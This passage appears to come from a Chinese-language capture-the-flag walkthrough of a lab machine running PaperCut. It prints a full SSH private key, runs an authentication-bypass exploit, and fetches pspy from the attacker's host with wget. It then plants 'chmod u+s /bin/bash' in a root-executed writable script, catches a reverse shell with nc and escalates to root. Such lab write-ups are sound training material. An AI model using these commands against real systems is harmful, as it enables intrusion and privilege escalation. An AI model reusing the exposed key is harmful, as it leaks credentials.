    vuln_version()
```
#### 本地登录
```
papercut@bamboo:~$ cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
```
[★]$ vi id_rsa
[★]$ chmod 600 id_rsa
[★]$ ssh -i id_rsa papercut@10.129.2.255 -L 9191:127.0.0.1:9191 -N
```
#### 再执行绕过
```
[★]$ python3 auth_bypass.py
Enter the ip address: 127.0.0.1
Version: 22.0.6
Vulnerable version
Step 1 visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
Step 2 visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
```
#### 从该漏洞利用程序中，我们获取了两个需要访问的 URL，访问这两个 URL 后，我们就能访问该应用程序。
#### 在burpsuite登录http://127.0.0.1:9191/app?service=page/SetupCompleted 可以不需要密码了
#### 我们发现能够访问控制面板，然后将 pspy 软件上传至该设备，以查看是否有某种功能会触发目录中的某个文件。
#### pspy :无 root 权限也能监控系统进程的工具
```
[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```
#### 我们发现能够访问控制面板，然后将 pspy 软件上传至该设备，以查看是否有某种功能会触发目录中的某个文件。
```
papercut@bamboo:~$ cd /tmp
cd /tmp
papercut@bamboo:/tmp$ wget http://10.10.14.27:9000/pspy64
wget http://10.10.14.27:9000/pspy64
--2026-03-08 09:53:08--  http://10.10.14.27:9000/pspy64
Connecting to 10.10.14.27:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  --.-KB/s    in 0.1s    

2026-03-08 09:53:08 (23.8 MB/s) - ‘pspy64’ saved [3104768/3104768]

papercut@bamboo:/tmp$ chmod +x pspy64
chmod +x pspy64
papercut@bamboo:/tmp$ ./pspy64  
```
#### 一直让它运行着$ ./pspy64  
#### 点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers
![图片](images/2026030801.png)
```
2026/03/08 10:13:03 CMD: UID=0     PID=139704 | /usr/bin/getent passwd 0 
2026/03/08 10:13:03 CMD: UID=0     PID=139705 | /usr/bin/getent passwd 0 
2026/03/08 10:13:03 CMD: UID=0     PID=139706 | /usr/bin/getent passwd 0 
2026/03/08 10:13:14 CMD: UID=0     PID=139715 | 
2026/03/08 10:13:14 CMD: UID=0     PID=139716 | 
2026/03/08 10:13:14 CMD: UID=0     PID=139727 | /usr/bin/snap run amazon-ssm-agent 
2026/03/08 10:13:14 CMD: UID=0     PID=139733 | /usr/bin/getent passwd 0 
2026/03/08 10:13:14 CMD: UID=0     PID=139734 | 
2026/03/08 10:13:14 CMD: UID=0     PID=139735 | /usr/bin/getent passwd 0 
2026/03/08 10:13:25 CMD: UID=0     PID=139745 | 
2026/03/08 10:13:25 CMD: UID=0     PID=139756 | /usr/bin/snap run amazon-ssm-agent 
```
#### 在burpsuite点击“Refresh servers”按钮后，我们发现执行的确实是相同的脚本。
```
2026/03/08 10:16:39 CMD: UID=0     PID=140289 | /usr/bin/snap run amazon-ssm-agent 
2026/03/08 10:16:40 CMD: UID=0     PID=140298 | /usr/bin/python3 -Es /usr/bin/lsb_release -sd 
2026/03/08 10:16:50 CMD: UID=0     PID=140307 | /sbin/init 
2026/03/08 10:16:50 CMD: UID=0     PID=140323 | /usr/bin/getent passwd 0 
2026/03/08 10:16:50 CMD: UID=0     PID=140324 | /usr/bin/getent passwd 0 
2026/03/08 10:16:50 CMD: UID=0     PID=140325 | /usr/bin/getent passwd 0 


```
#### 以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
#### 命令好使 echo 'chmod u+s /bin/bash' > server-command 直接写进linux-x64系统，而且连着网页的刷新
```
papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
cd /home/papercut/server/bin/linux-x64
papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
<ux-x64$ echo 'chmod u+s /bin/bash' > server-command
papercut@bamboo:~/server/bin/linux-x64$ cd ~
cd ~
papercut@bamboo:~$ cd /tmp
cd /tmp
papercut@bamboo:/tmp$ ./pspy64
2026/03/08 10:25:38 CMD: UID=0     PID=141701 | /usr/bin/getent passwd 0 
2026/03/08 10:25:47 CMD: UID=0     PID=141710 | bash -c "/home/papercut/server/bin/linux-x64/server-command" get-config health.api.key 
2026/03/08 10:25:47 CMD: UID=0     PID=141711 | chmod u+s /bin/bash
2026/03/08 10:26:51 CMD: UID=0     PID=141895 | cmp --silent /tmp/tmp.lIowgGonTK /tmp/tmp.NYz86DXWZ1 
```
![图片](images/2026030802.png)
### 提权
```
[★]$ nc -lvnp 5544
listening on [any] 5544 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.2.255] 40190
sh: 0: can't access tty; job control turned off
$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
bash-5.1$ id
id
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
bash-5.1$ ls
ls
bin	deployment   lib      reports			  server.uuid
custom	event-store  lib-ext  server.properties		  tmp
data	examples     logs     server.properties.template  version.txt

bash-5.1$ cd tmp
cd tmp
bash-5.1$ ls
ls
jetty-0_0_0_0-9191-webapp-64379-_-any-2344844607086584819  upload
reports							   webapp-64379
bash-5.1$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
bash-5.1$ /bin/bash -p
/bin/bash -p
bash-5.1# id
id
uid=1001(papercut) gid=1001(papercut) euid=0(root) groups=1001(papercut)
bash-5.1# cat /root/root.txt
cat /root/root.txt
```
